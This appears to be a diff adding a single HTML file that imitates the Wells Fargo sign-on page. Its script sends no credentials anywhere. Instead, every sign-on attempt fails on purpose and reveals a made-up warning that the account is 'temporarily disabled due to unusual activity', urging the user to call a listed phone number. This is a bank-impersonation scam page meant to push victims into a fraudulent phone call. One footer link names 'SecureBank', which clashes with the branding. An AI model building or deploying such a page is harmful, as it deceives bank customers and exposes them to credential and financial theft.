@@ -1,0 +1,918 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" sizes="32x32" href="wf.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="wf.png">
+    <link rel="shortcut icon" href="wf.png">
+    <title>Sign On to View Your Accounts | Wells Fargo</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Roboto+Slab:wght@300;400;500;600&display=swap"
+        rel="stylesheet">
+    <style>
+        :root {
+            --color-surface: #ffffff;
+            --color-surface-muted: #f6f7f9;
+            --color-text: #111827;
+            --color-muted: #6b7280;
+            --color-border: #d1d5db;
+            --color-border-strong: #9ca3af;
+            --color-primary: #d71e28;
+            --color-primary-hover: #c01a23;
+            --color-primary-active: #a8141c;
+            --color-focus: #2563eb;
+            --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.06);
+            --shadow-md: 0 10px 25px rgba(0, 0, 0, 0.12);
+            --radius-sm: 8px;
+            --radius-md: 12px;
+            --radius-lg: 16px;
+            --radius-pill: 9999px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: url('Summer2025_Morning.jpg') no-repeat center center fixed;
+            background-size: cover;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            color: var(--color-text);
+        }
+
+        /* Header */
+        .header {
+            background: linear-gradient(135deg, #d71e28 0%, #d71e28 100%);
+            padding: 16px 28px;
+            box-shadow: var(--shadow-sm);
+        }
+
+        .header1 {
+            background: linear-gradient(135deg, #ffcd41 0%, #ffcd41 100%);
+            padding: 2px 5px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.08);
+        }
+
+        .header-content {
+            max-width: 1100px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            color: white;
+            font-family: 'Roboto Slab', serif;
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+
+        .header-links {
+            display: flex;
+            gap: 25px;
+            align-items: center;
+        }
+
+        .header-links a {
+            color: white;
+            text-decoration: none;
+            font-size: 14px;
+            transition: opacity 0.3s;
+        }
+
+        .header-links a:hover {
+            opacity: 0.8;
+        }
+
+        .search-icon {
+            background: white;
+            padding: 8px 12px;
+            border-radius: var(--radius-pill);
+            cursor: pointer;
+            display: inline-flex;
+            gap: 8px;
+            align-items: center;
+            color: var(--color-text);
+            border: 1px solid rgba(0, 0, 0, 0.08);
+        }
+
+        .icon {
+            width: 18px;
+            height: 18px;
+            display: block;
+        }
+
+        /* Main Content */
+        .main-content {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .login-container {
+            background: var(--color-surface);
+            border-radius: var(--radius-lg);
+            box-shadow: var(--shadow-md);
+            width: 100%;
+            max-width: 850px;
+            padding: 44px 56px;
+            margin: 0 auto 16px;
+        }
+
+        .disclaimer {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 50%;
+            padding: 30px;
+            margin-bottom: 20px;
+        }
+
+        .disclaimer-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .disclaimer-list {
+            list-style-type: none;
+            margin-bottom: 15px;
+        }
+
+        .disclaimer-list li {
+            margin-bottom: 10px;
+            font-size: 18px;
+            color: #333;
+            line-height: 1.4;
+            padding-left: 20px;
+            position: relative;
+        }
+
+        .disclaimer-list li:before {
+            content: "•";
+            position: absolute;
+            left: 0;
+            color: #040404;
+            font-weight: bold;
+        }
+
+        .greeting {
+            font-size: 32px;
+            color: var(--color-text);
+            text-align: center;
+            margin: 0 0 28px;
+            font-weight: 300;
+            letter-spacing: -0.01em;
+        }
+
+        .login-error {
+            display: flex;
+            gap: 14px;
+            align-items: flex-start;
+            background: #fff5f5;
+            border: 1px solid #f3b2b2;
+            border-radius: var(--radius-md);
+            padding: 16px 18px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.06);
+            width: 100%;
+            max-width: 620px;
+            margin: 0 auto 22px;
+        }
+
+        .login-error[hidden] {
+            display: none !important;
+        }
+
+        .login-error-icon {
+            width: 28px;
+            height: 28px;
+            flex: 0 0 28px;
+            color: var(--color-primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: var(--radius-pill);
+            background: #ffffff;
+            border: 1px solid #f3b2b2;
+        }
+
+        .login-error-message {
+            font-size: 16px;
+            line-height: 1.4;
+            color: var(--color-text);
+        }
+
+        .login-error-message a {
+            color: #4338ca;
+            text-decoration: underline;
+            font-weight: 600;
+        }
+
+        .form-group {
+            margin-bottom: 14px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 8px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            max-width: 420px;
+            margin: 0 auto;
+        }
+
+        .input-wrapper .field-label {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 15px;
+            color: var(--color-muted);
+            transition: all 0.15s ease;
+            pointer-events: none;
+            padding: 0 4px;
+            z-index: 1;
+        }
+
+        .input-wrapper .field-label.required::after {
+            content: " *";
+            color: var(--color-primary);
+            font-weight: 700;
+        }
+
+        .form-group input[type="text"],
+        .form-group input[type="password"] {
+            width: 100%;
+            height: 52px;
+            padding: 18px 52px 8px 12px;
+            border: 1px solid var(--color-border);
+            border-radius: var(--radius-lg);
+            font-size: 15px;
+            transition: border-color 0.2s, box-shadow 0.2s, background-color 0.2s;
+            background: var(--color-surface);
+            color: var(--color-text);
+        }
+
+        .form-group.is-invalid input[type="text"],
+        .form-group.is-invalid input[type="password"] {
+            border-color: #f3b2b2;
+        }
+
+        .form-group.is-invalid input[type="text"]:focus,
+        .form-group.is-invalid input[type="password"]:focus {
+            border-color: var(--color-primary);
+            box-shadow: 0 0 0 3px rgba(215, 30, 40, 0.18);
+        }
+
+        .field-error {
+            max-width: 420px;
+            margin: 8px auto 0;
+            font-size: 13px;
+            line-height: 1.35;
+            color: var(--color-primary);
+        }
+
+        .field-error[hidden] {
+            display: none !important;
+        }
+
+        .form-group input[type="text"]:hover,
+        .form-group input[type="password"]:hover {
+            border-color: var(--color-border-strong);
+        }
+
+        .input-wrapper:focus-within .field-label,
+        .input-wrapper input:not(:placeholder-shown)+.field-label {
+            top: 6px;
+            transform: none;
+            font-size: 12px;
+            background: var(--color-surface);
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--color-focus);
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.18);
+        }
+
+        .input-icon {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: var(--color-muted);
+            width: 32px;
+            height: 32px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: transparent;
+            border: 0;
+            padding: 0;
+            border-radius: var(--radius-pill);
+            transition: background-color 0.15s, color 0.15s, box-shadow 0.15s;
+        }
+
+        button.input-icon {
+            appearance: none;
+        }
+
+        .input-icon:hover {
+            color: var(--color-text);
+            background: rgba(17, 24, 39, 0.06);
+        }
+
+        .input-icon:focus-visible {
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.18);
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin: 18px auto 18px;
+            max-width: 420px;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            margin-top: 3px;
+        }
+
+        .checkbox-group label {
+            font-size: 13px;
+            color: #666;
+            line-height: 1.5;
+        }
+
+        .btn-signin {
+            width: 100%;
+            max-width: 220px;
+            padding: 14px 16px;
+            background: #e5e7eb;
+            border: none;
+            border-radius: var(--radius-pill);
+            font-size: 16px;
+            color: #9ca3af;
+            cursor: pointer;
+            margin: 18px auto 0;
+            transition: background-color 0.15s, color 0.15s, box-shadow 0.15s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-signin:disabled {
+            cursor: not-allowed;
+            opacity: 1;
+        }
+
+        .btn-signin.is-loading {
+            cursor: progress;
+        }
+
+        .btn-spinner {
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            border: 2px solid rgba(255, 255, 255, 0.55);
+            border-top-color: #fff;
+            display: none;
+            animation: spin 0.9s linear infinite;
+        }
+
+        .btn-signin.is-loading .btn-spinner {
+            display: inline-block;
+        }
+
+        .btn-signin.is-loading .btn-text {
+            opacity: 0.9;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .sr-only {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            white-space: nowrap;
+            border: 0;
+        }
+
+        .btn-signin.is-ready {
+            background: var(--color-primary);
+            color: #fff;
+        }
+
+        .btn-signin.is-ready:hover {
+            background: var(--color-primary-hover);
+        }
+
+        .btn-signin.is-ready:active {
+            background: var(--color-primary-active);
+        }
+
+        .btn-signin:focus-visible {
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.18);
+        }
+
+        .divider {
+            text-align: center;
+            color: var(--color-muted);
+            margin: 18px 0;
+            font-size: 14px;
+        }
+
+        .btn-passkey {
+            width: 100%;
+            max-width: 220px;
+            padding: 14px 16px;
+            background: var(--color-surface);
+            border: 1px solid var(--color-border-strong);
+            border-radius: var(--radius-pill);
+            font-size: 16px;
+            color: var(--color-text);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin: 0 auto;
+            transition: background-color 0.15s, border-color 0.15s, box-shadow 0.15s;
+        }
+
+        .btn-passkey:hover {
+            background: var(--color-surface-muted);
+            border-color: var(--color-text);
+        }
+
+        .btn-passkey:active {
+            background: rgba(17, 24, 39, 0.08);
+        }
+
+        .btn-passkey:focus-visible {
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.18);
+        }
+
+        .passkey-info {
+            text-align: center;
+            font-size: 13px;
+            color: var(--color-muted);
+            margin-top: 15px;
+            line-height: 1.5;
+        }
+
+        .forgot-link {
+            text-align: center;
+            margin-top: 25px;
+        }
+
+        .forgot-link a {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .forgot-link a {
+            color: #1d4ed8;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-link a:hover {
+            text-decoration: underline;
+        }
+
+        /* Footer */
+        .footer {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 30px 20px;
+            margin-top: auto;
+        }
+
+        .footer-content {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .footer-note {
+            text-align: center;
+            color: #666;
+            font-size: 13px;
+            margin-bottom: 15px;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: left;
+            gap: 20px;
+            margin-bottom: 15px;
+        }
+
+        .footer-links a {
+            color: #2a5298;
+            text-decoration: none;
+            font-size: 13px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .copyright {
+            text-align: left;
+            color: #666;
+            font-size: 12px;
+            margin-top: 15px;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .header-links {
+                gap: 15px;
+            }
+
+            .header-links a {
+                font-size: 12px;
+            }
+
+            .login-container {
+                padding: 32px 22px;
+            }
+
+            .greeting {
+                font-size: 26px;
+            }
+
+            .footer-links {
+                flex-direction: column;
+                gap: 10px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <div class="logo">WELLS FARGO</div>
+            <nav class="header-links">
+                <a href="#">Enroll</a>
+                <a href="#">Customer Service</a>
+                <a href="#">ATM Locations</a>
+                <a href="#">Español</a>
+                <span class="search-icon">
+                    <span>Search</span>
+                    <svg class="icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"
+                        aria-hidden="true">
+                        <path d="M10.5 18a7.5 7.5 0 1 1 0-15 7.5 7.5 0 0 1 0 15Z" stroke="currentColor"
+                            stroke-width="1.8" />
+                        <path d="M16.5 16.5 21 21" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" />
+                    </svg>
+                </span>
+            </nav>
+        </div>
+    </header>
+    <div class="header1"></div>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <div class="login-container">
+            <div class="login-error" id="loginError" role="alert" aria-live="polite" tabindex="-1" hidden>
+                <div class="login-error-icon" aria-hidden="true">
+                    <svg viewBox="0 0 24 24" width="25" height="28" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 2L22 20H2L12 2Z" stroke="currentColor" stroke-width="1.8"
+                            stroke-linejoin="round" />
+                        <path d="M12 9V13" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" />
+                        <path d="M12 17H12.01" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" />
+                    </svg>
+                </div>
+                <div class="login-error-message">
+                    <p> For your security, online access to your account has been temporarily disabled due to unusual activity. Please contact Online Banking Department at <strong>+1-877-417-4459</strong>.</p>
+                </div>
+            </div>
+            <div id="submitStatus" class="sr-only" role="status" aria-live="polite"></div>
+            <h1 class="greeting">Good morning</h1>
+
+            <form id="loginForm" novalidate>
+                <div class="form-group">
+                    <div class="input-wrapper">
+                        <input type="text" id="username" name="username" autocomplete="username" placeholder=" "
+                            required aria-required="true" aria-describedby="usernameError" />
+                        <label for="username" class="field-label required">Username</label>
+                        <span class="input-icon" aria-hidden="true">
+                            <svg class="icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M12 12a4 4 0 1 0-4-4 4 4 0 0 0 4 4Z" stroke="currentColor"
+                                    stroke-width="1.8" />
+                                <path d="M4.5 20a7.5 7.5 0 0 1 15 0" stroke="currentColor" stroke-width="1.8"
+                                    stroke-linecap="round" />
+                            </svg>
+                        </span>
+                    </div>
+                    <div class="field-error" id="usernameError" hidden></div>
+                </div>
+
+                <div class="form-group">
+                    <div class="input-wrapper">
+                        <input type="password" id="password" name="password" autocomplete="current-password"
+                            placeholder=" " required aria-required="true" aria-describedby="passwordError" />
+                        <label for="password" class="field-label required">Password</label>
+                        <button type="button" class="input-icon" id="togglePassword" aria-label="Show password"
+                            aria-pressed="false">
+                            <svg class="icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"
+                                aria-hidden="true">
+                                <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12Z" stroke="currentColor"
+                                    stroke-width="1.8" stroke-linejoin="round" />
+                                <path d="M12 15a3 3 0 1 0-3-3 3 3 0 0 0 3 3Z" stroke="currentColor"
+                                    stroke-width="1.8" />
+                            </svg>
+                        </button>
+                    </div>
+                    <div class="field-error" id="passwordError" hidden></div>
+                </div>
+
+                <div class="checkbox-group">
+                    <input type="checkbox" id="saveUsername" name="saveUsername" />
+                    <label for="saveUsername">
+                        Save username<br>
+                        <small>To help keep your account secure, save your username only on devices that aren't used by
+                            other people.</small>
+                    </label>
+                </div>
+
+                <button type="submit" class="btn-signin">
+                    <span class="btn-text">Sign on</span>
+                    <span class="btn-spinner" aria-hidden="true"></span>
+                </button>
+
+                <div class="divider">or</div>
+
+                <button type="button" class="btn-passkey">
+                    <svg class="icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"
+                        aria-hidden="true">
+                        <path d="M7 14a5 5 0 1 1 9.6 2H22v4h-3v-2h-2v2h-3.4A5 5 0 0 1 7 14Z" stroke="currentColor"
+                            stroke-width="1.8" stroke-linejoin="round" />
+                        <path d="M12 14h.01" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" />
+                    </svg>
+                    <span>Use a passkey</span>
+                </button>
+
+                <p class="passkey-info">
+                    Don't have one? Create a passkey after signing on and skip the password next time.
+                </p>
+
+                <div class="forgot-link">
+                    <a href="#">
+                        <svg class="icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"
+                            aria-hidden="true">
+                            <path d="M5 12h14" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" />
+                            <path d="M15 6l6 6-6 6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"
+                                stroke-linejoin="round" />
+                        </svg>
+                        <span>Forgot username or password?</span>
+                    </a>
+                </div>
+            </form>
+        </div>
+    </main>
+
+    <main class="main-content">
+        <div class="disclaimer">
+            <div class="disclaimer-title">Investment and Insurance Products are:</div>
+            <ul class="disclaimer-list">
+                <li>Not Insured by the FDIC or Any Federal Government Agency</li>
+                <li>Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate</li>
+                <li>Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested</li>
+            </ul>
+            <div style="font-size: 13px; color: #333;">
+                Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-content">
+
+
+            <div class="footer-links">
+                <a href="#">About SecureBank</a>
+                <a href="#">Online Access Agreement</a>
+                <a href="#">Privacy, Cookies, Security & Legal</a>
+                <a href="#">Do not sell or share my personal information</a>
+                <a href="#">Notice of Data Collection</a>
+            </div>
+
+            <div class="footer-links">
+                <a href="#">Report Email Fraud</a>
+                <a href="#">Security Center</a>
+                <a href="#">Sitemap</a>
+                <a href="#">Give Us Feedback</a>
+            </div>
+
+            <p class="copyright">
+                © 1999 - 2026 Wells Fargo. All rights reserved. NMLSR ID 399801
+            </p>
+        </div>
+    </footer>
+
+    <script>
+        const togglePasswordButton = document.getElementById('togglePassword');
+        const eyeIconSvg = `
+            <svg class="icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
+                <path d="M12 15a3 3 0 1 0-3-3 3 3 0 0 0 3 3Z" stroke="currentColor" stroke-width="1.8"/>
+            </svg>
+        `;
+        const eyeOffIconSvg = `
+            <svg class="icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                <path d="M2 12s3.5-7 10-7c2.1 0 3.9.7 5.4 1.7" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+                <path d="M22 12s-3.5 7-10 7c-2.1 0-3.9-.7-5.4-1.7" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+                <path d="M9.9 9.9a3 3 0 0 0 4.2 4.2" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+                <path d="M4 4l16 16" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+            </svg>
+        `;
+
+        const updatePasswordToggleUi = () => {
+            if (!togglePasswordButton) return;
+            const passwordInput = document.getElementById('password');
+            const isVisible = passwordInput && passwordInput.getAttribute('type') !== 'password';
+            togglePasswordButton.innerHTML = isVisible ? eyeOffIconSvg : eyeIconSvg;
+            togglePasswordButton.setAttribute('aria-label', isVisible ? 'Hide password' : 'Show password');
+            togglePasswordButton.setAttribute('aria-pressed', isVisible ? 'true' : 'false');
+        };
+
+        if (togglePasswordButton) {
+            togglePasswordButton.addEventListener('click', function () {
+                const passwordInput = document.getElementById('password');
+                if (!passwordInput) return;
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                updatePasswordToggleUi();
+            });
+        }
+        updatePasswordToggleUi();
+
+        const form = document.getElementById('loginForm');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const signOnButton = document.querySelector('.btn-signin');
+        const loginError = document.getElementById('loginError');
+        const submitStatus = document.getElementById('submitStatus');
+        const usernameError = document.getElementById('usernameError');
+        const passwordError = document.getElementById('passwordError');
+
+        let hasSubmitted = false;
+        let isSubmitting = false;
+
+        const hideLoginError = () => {
+            if (!loginError) return;
+            loginError.hidden = true;
+        };
+
+        const setSubmitting = (submitting) => {
+            isSubmitting = submitting;
+            if (form) form.setAttribute('aria-busy', submitting ? 'true' : 'false');
+            if (signOnButton) {
+                signOnButton.classList.toggle('is-loading', submitting);
+                signOnButton.disabled = submitting || signOnButton.disabled;
+            }
+            if (usernameInput) usernameInput.disabled = submitting;
+            if (passwordInput) passwordInput.disabled = submitting;
+            if (togglePasswordButton) togglePasswordButton.disabled = submitting;
+        };
+
+        const setFieldError = (inputEl, errorEl, message) => {
+            const formGroup = inputEl ? inputEl.closest('.form-group') : null;
+            const show = hasSubmitted && Boolean(message);
+            if (formGroup) formGroup.classList.toggle('is-invalid', show);
+            if (inputEl) inputEl.setAttribute('aria-invalid', show ? 'true' : 'false');
+            if (errorEl) {
+                errorEl.textContent = show ? message : '';
+                errorEl.hidden = !show;
+            }
+        };
+
+        const validateRequiredFields = () => {
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            setFieldError(usernameInput, usernameError, username ? '' : 'Please enter your username.');
+            setFieldError(passwordInput, passwordError, password ? '' : 'Please enter your password.');
+
+            return Boolean(username && password);
+        };
+
+        const updateSignOnButton = () => {
+            const hasUsername = usernameInput.value.trim().length > 0;
+            const hasPassword = passwordInput.value.trim().length > 0;
+            const isReady = hasUsername && hasPassword;
+            signOnButton.classList.toggle('is-ready', isReady);
+            signOnButton.disabled = isSubmitting || !isReady;
+        };
+
+        const handleInputChange = () => {
+            hideLoginError();
+            if (hasSubmitted) validateRequiredFields();
+            updateSignOnButton();
+        };
+
+        ['input', 'change', 'keyup'].forEach((eventName) => {
+            usernameInput.addEventListener(eventName, handleInputChange);
+            passwordInput.addEventListener(eventName, handleInputChange);
+        });
+        updateSignOnButton();
+        window.addEventListener('pageshow', updateSignOnButton);
+        setTimeout(updateSignOnButton, 150);
+        setTimeout(updateSignOnButton, 600);
+
+        if (form) form.addEventListener('submit', function (e) {
+            e.preventDefault();
+            if (isSubmitting) return;
+
+            hasSubmitted = true;
+            hideLoginError();
+            const isValid = validateRequiredFields();
+            updateSignOnButton();
+
+            if (!isValid) {
+                const firstInvalid = form.querySelector('[aria-invalid="true"]');
+                if (firstInvalid) firstInvalid.focus();
+                return;
+            }
+
+            if (submitStatus) submitStatus.textContent = 'Signing on…';
+            setSubmitting(true);
+
+            setTimeout(() => {
+                setSubmitting(false);
+                if (submitStatus) submitStatus.textContent = 'Sign on failed.';
+                if (loginError) {
+                    loginError.hidden = false;
+                    loginError.focus();
+                }
+                updateSignOnButton();
+            }, 700);
+        });
+
+        const greetingEl = document.querySelector('.greeting');
+
+        const getGreeting = (date) => {
+            const hour = date.getHours();
+            if (hour >= 17) return 'Good evening';
+            if (hour >= 12) return 'Good afternoon';
+            return 'Good morning';
+        };
+
+        const updateGreeting = () => {
+            if (!greetingEl) return;
+            greetingEl.textContent = getGreeting(new Date());
+        };
+
+        const scheduleGreetingUpdates = () => {
+            updateGreeting();
+            const now = new Date();
+            const msToNextMinute = (60 - now.getSeconds()) * 1000 - now.getMilliseconds();
+            setTimeout(() => {
+                updateGreeting();
+                setInterval(updateGreeting, 60 * 1000);
+            }, msToNextMinute);
+        };
+
+        scheduleGreetingUpdates();
+    </script>
+</body>
+
+</html>
